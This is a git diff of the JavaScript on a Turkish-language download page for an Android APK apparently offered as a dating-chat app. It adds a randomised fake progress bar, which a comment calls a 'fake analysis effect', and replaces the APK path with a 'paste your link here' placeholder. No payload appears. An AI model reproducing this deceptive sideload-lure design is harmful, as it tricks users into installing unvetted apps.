@@ -147,21 +147,6 @@ popup.classList.add('show');
 setTimeout(()=>popup.classList.remove('show'),3000);
 },4000);
 
-function startDownload(){
-let loader=document.getElementById('loader');
-let progress=document.getElementById('progress');
-loader.classList.add('show');
-let width=0;
-let interval=setInterval(()=>{
-width+=5;
-progress.style.width=width+'%';
-if(width>=100){
-clearInterval(interval);
-window.location.href='tanisma-sohbet.apk';
-}
-},120);
-}
-
 // cihaz kontrolü (Android değilse uyarı)
 function isAndroid(){
 return /Android/i.test(navigator.userAgent);
@@ -186,7 +171,37 @@ if(width>=100){
 clearInterval(interval);
 // küçük gecikme (premium hissi)
 setTimeout(()=>{
-window.location.href='tanisma-sohbet.apk';
+window.location.href='BURAYA_LINKİNİ_YAPIŞTIR';
+},500);
+}
+},100);
+}
+
+// sayfa açılınca sahte analiz efekti (Android değilse uyarı)
+function isAndroid(){
+return /Android/i.test(navigator.userAgent);
+}
+
+function startDownload(){
+if(!isAndroid()){
+alert("Bu uygulama sadece Android cihazlar içindir");
+return;
+}
+
+let loader=document.getElementById('loader');
+let progress=document.getElementById('progress');
+loader.classList.add('show');
+
+let width=0;
+let interval=setInterval(()=>{
+width+=Math.random()*8;
+progress.style.width=width+'%';
+
+if(width>=100){
+clearInterval(interval);
+// küçük gecikme (premium hissi)
+setTimeout(()=>{
+window.location.href='BURAYA_LINKİNİ_YAPIŞTIR';
 },500);
 }
 },100);
